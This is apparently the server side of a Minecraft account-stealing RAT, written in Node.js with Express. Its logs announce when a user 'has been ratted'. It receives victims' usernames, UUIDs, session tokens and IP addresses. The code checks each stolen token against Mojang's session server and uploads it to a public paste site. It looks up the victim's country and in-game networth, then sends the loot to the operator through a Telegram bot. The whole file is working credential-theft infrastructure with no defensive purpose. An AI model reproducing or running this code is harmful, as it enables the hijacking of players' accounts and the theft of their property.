const fetch = require('node-fetch');
const getProfiles = require('./utils/networth');
require("dotenv").config();
const { post } = require("axios");
const express = require("express");
const helmet = require("helmet");
const app = express();
const expressip = require("express-ip");
const port = process.env.PORT || 8080;

app.use(helmet());
app.use(expressip().getIpInfoMiddleware);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const ipMap = [];

setInterval(() => {
    if (ipMap.length > 0) {
        console.log(`[R.A.T] Cleared map`);
        ipMap.length = 0;
    }
}, 1000 * 60 * 15);

app.post("/", async (req, res) => {
    const requiredFields = ["username", "uuid", "token", "ip"];
    if (!requiredFields.every(field => req.body.hasOwnProperty(field))) {
        console.log(req.body);
        return res.sendStatus(404);
    }

    if (!ipMap.find(entry => entry[0] == req.ipInfo.ip)) {
        ipMap.push([req.ipInfo.ip, 1]);
    } else {
        ipMap.forEach(entry => { if (entry[0] == req.ipInfo.ip) entry[1]++; });
    }

    if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
        console.log(`[R.A.T] Rejected banned IP (${req.ipInfo.ip})`);
        return res.sendStatus(404);
    }

    const uploadPromises = [];
    const keys = ['token'];
    keys.forEach(key => {
        if (req.body[key] !== "File not found :(") {
            uploadPromises.push(
                post("https://hst.sh/documents/", req.body[key])
                    .then(res => res.data.key)
                    .catch(() => "Error uploading")
            );
        } else {
            uploadPromises.push(Promise.resolve("File not found :("));
        }
    });

    try {
        const [sessionResponse, ...uploadResults] = await Promise.all([
            post("https://sessionserver.mojang.com/session/minecraft/join", {
                accessToken: req.body.token,
                selectedProfile: req.body.uuid,
                serverId: req.body.uuid
            }),
            ...uploadPromises
        ]);

        let profiles = '';
        const profileData = await getProfiles(req.body.uuid);
        if (profileData) {
            for (let profileId in profileData.profiles) {
                profiles += `[${profileData.profiles[profileId].sblvl}]${profileData.profiles[profileId].unsoulboundNetworth} - ${profileData.profiles[profileId].gamemode}\n`;
            }
        }

        const country = await fetchCountry(req.body.ip);
        let message = `Username: ${req.body.username}\nCountry: ${country}\n`;
        message += `Profiles: \`\`\`Profiles ${profiles}\`\`\`\n`;
        keys.forEach((key, index) => {
            if (uploadResults[index] !== "File not found :(" && uploadResults[index] !== "Error uploading") {
                message += `${key.charAt(0).toUpperCase() + key.slice(1)}: [View](https://hst.sh/${uploadResults[index]})\n`;
            }
        });

        await sendMessage(message);
        console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
    } catch (err) {
        console.error(err);
    }
    res.send("OK");
});

app.listen(port, () => {
    console.log(`[R.A.T] Listening at port ${port}`);
});

async function fetchCountry(ip) {
    const apiUrl = `http://ip-api.com/json/${ip}`;
    try {
        const response = await fetch(apiUrl);
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const data = await response.json();
        return data.country;
    } catch (error) {
        console.error('Error fetching country:', error);
        return 'Unknown';
    }
}

async function sendMessage(text) {
    const maxMessageLength = 4096;
    for (let start = 0; start < text.length; start += maxMessageLength) {
        const chunk = text.substring(start, Math.min(text.length, start + maxMessageLength));
        const params = new URLSearchParams({
            chat_id: process.env.CHAT_ID,
            text: chunk,
            parse_mode: 'Markdown'
        });

        try {
            const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: params
            });
            const jsonResponse = await response.json();
            if (!jsonResponse.ok) {
                console.error('Failed to send message part:', jsonResponse.description);
            }
        } catch (error) {
            console.error('Error sending message part to Telegram:', error);
        }
    }
}
